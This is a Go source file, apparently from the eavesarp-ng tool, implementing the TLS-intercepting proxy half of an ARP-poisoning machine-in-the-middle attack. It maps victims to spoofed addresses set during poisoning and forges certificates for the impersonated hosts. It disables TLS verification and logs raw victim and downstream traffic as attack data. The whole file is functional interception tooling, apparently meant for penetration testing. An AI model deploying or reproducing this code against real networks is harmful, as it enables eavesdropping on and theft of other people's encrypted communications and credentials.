package proxy

import (
	"crypto/tls"
	"github.com/impostorkeanu/eavesarp-ng/misc"
	gs "github.com/impostorkeanu/gosplit"
	"go.uber.org/zap"
	"io"
	"sync"
	"time"
)

type (
	// TCPCfg implements various GoSplit interfaces, allowing
	// it to be passed to the TLS intercepting proxy it offers.
	TCPCfg struct {
		// connMap is a mapping of source addresses to downstream
		// net.IP instances, allowing the proxy to discover the
		// downstream IP address that will receive proxied traffic.
		//
		// Note: mapping values are set by sniff.AttackSnac
		// during poisoning attacks.
		connMap *sync.Map
		// spoofedMap is a mapping of victim addresses to spoofed addresses,
		// allowing us to obtain IP values during TLS certificate generation.
		//
		// Note: values are set by sniff.AttackSnac
		spoofedMap           *sync.Map
		downstreamCertGetter DsCertGetter // function to get a TLS certificate for downstreams
		log                  *zap.Logger  // logger for log events
		dataW                io.Writer    // writer to receive JSON data
	}

	// DsCertGetter is a function used to get the certificate for
	// TLS connections to downstreams.
	DsCertGetter func(proxyIP, downstreamIP string) func(*tls.ClientHelloInfo) (*tls.Certificate, error)
)

var (
	// dsTLSCfg is the downstream TLS configuration used for
	// all downstream configurations.
	dsTLSCfg = &tls.Config{
		InsecureSkipVerify: true, // skip TLS verification for downstreams
	}
)

// NewTCPCfg initializes and returns a pointer to a TCPCfg, which
// implements all necessary GoSplit interfaces.
func NewTCPCfg(connMap *sync.Map, spoofedMap *sync.Map, downstreamCertGetter DsCertGetter, log *zap.Logger, dataLog io.Writer) *TCPCfg {
	return &TCPCfg{
		log:                  log,
		connMap:              connMap,
		spoofedMap:           spoofedMap,
		downstreamCertGetter: downstreamCertGetter,
		dataW:                dataLog,
	}
}

//==========================
// GOSPLIT INTERFACE METHODS
//==========================

func (cfg *TCPCfg) RecvVictimData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil || len(b) == 0 {
		return
	}
	data := cfg.connInfoToData(cI, b, misc.VictimDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write victim data to log", zap.Error(err))
	}
}

func (cfg *TCPCfg) RecvDownstreamData(cI gs.ConnInfo, b []byte) {
	if cfg.dataW == nil || len(b) == 0 {
		return
	}
	data := cfg.connInfoToData(cI, b, misc.DownstreamDataSender)
	if err := data.Log(cfg.dataW); err != nil {
		cfg.log.Error("failed to write downstream data to log", zap.Error(err))
	}
}

// RecvConnStart to implement gosplit.ConnInfoReceiver.
func (cfg *TCPCfg) RecvConnStart(i gs.ConnInfo) {
	cfg.log.Debug("new connection started", zap.Any("conn", i))
}

// RecvConnEnd to implement gosplit.ConnInfoReceiver
//
// This removes the cfg.connMap entry for the current connection.
func (cfg *TCPCfg) RecvConnEnd(i gs.ConnInfo) {
	cfg.log.Debug("connection ended", zap.Any("conn", i))
	cfg.connMap.Delete(misc.Addr{
		IP: i.Victim.IP, Port: i.Victim.Port,
		Transport: misc.TCPTransport})
}

func (cfg *TCPCfg) RecvLog(r gs.LogRecord) {
	cfg.log.Info("received log event from tcp proxy", zap.Any("record", r))
}

// GetProxyTLSConfig returns the TLS config for each connection.
func (cfg *TCPCfg) GetProxyTLSConfig(vA gs.Addr, pA gs.Addr, dA *gs.Addr) (*tls.Config, error) {

	// this is a last resort when no spoofed
	// address is recovered from spoofedMap
	if dA == nil {
		dA = &pA
	}
	sA := misc.Addr{IP: dA.IP}

	if a, ok := cfg.spoofedMap.Load(vA.String()); !ok {
		cfg.log.Warn("failed to find spoofed address while getting proxy tls config")
	} else if sA, ok = a.(misc.Addr); !ok { // use mapped value instead of downstream
		cfg.log.Warn("non-string value returned from spoof map")
	}

	return &tls.Config{
		InsecureSkipVerify: true,
		GetCertificate:     cfg.downstreamCertGetter(sA.IP, dA.IP),
	}, nil
}

func (cfg *TCPCfg) GetDownstreamAddr(vicA gs.Addr, _ gs.Addr) (ds *gs.Addr, err error) {
	// try to retrieve downstream connection a few times
	for i := 0; i < 3; i++ {
		if d, ok := cfg.connMap.Load(misc.Addr{IP: vicA.IP, Port: vicA.Port, Transport: misc.TCPTransport}); ok {
			ds = &gs.Addr{IP: d.(misc.Addr).IP, Port: d.(misc.Addr).Port}
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	return
}

func (cfg *TCPCfg) GetDownstreamTLSConfig(_ gs.Addr, _ gs.Addr, _ gs.Addr) (*tls.Config, error) {
	return dsTLSCfg, nil
}

func (cfg *TCPCfg) connInfoToData(c gs.ConnInfo, data []byte, sender misc.DataSender) misc.AttackData {
	vA, sA, err := misc.NewVictimAddr(c.Victim.IP, c.Victim.Port, cfg.spoofedMap, misc.TCPTransport)
	if err != nil {
		cfg.log.Error("failed to create victim address for tcp data logging", zap.Error(err))
	}

	d := misc.AttackData{
		Sender:         sender,
		VictimAddr:     vA,
		ProxyAddr:      misc.Addr{IP: c.Proxy.IP, Port: c.Proxy.Port, Transport: misc.TCPTransport},
		Transport:      misc.TCPTransport,
		Raw:            data,
		DownstreamAddr: nil,
	}
	if sA != nil {
		d.SpoofedAddr = *sA
	}

	if c.Downstream != nil {
		d.DownstreamAddr = &misc.Addr{IP: c.Downstream.IP, Port: c.Downstream.Port, Transport: misc.TCPTransport}
	}

	return d
}
